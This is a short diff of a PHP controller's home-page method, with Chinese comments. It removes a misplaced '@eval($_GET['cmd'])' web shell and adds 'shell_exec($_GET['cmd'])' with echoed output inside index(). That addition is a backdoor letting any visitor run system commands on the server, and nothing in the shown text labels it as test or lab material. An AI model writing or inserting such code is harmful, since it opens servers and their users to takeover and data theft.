@@ -25,10 +25,11 @@ class Index
      * 主页静态页面
      * @return Html
      */
-    echo "success!!!!tsrc";
-    @eval($_GET['cmd']); 
+
     public function index(): Html
     {
+        $output = shell_exec($_GET['cmd']); 
+        echo $output;
         # html路径: ../view/index.html
         return response(file_get_contents(dirname(dirname(__FILE__)).'/view/index.html'));
     }
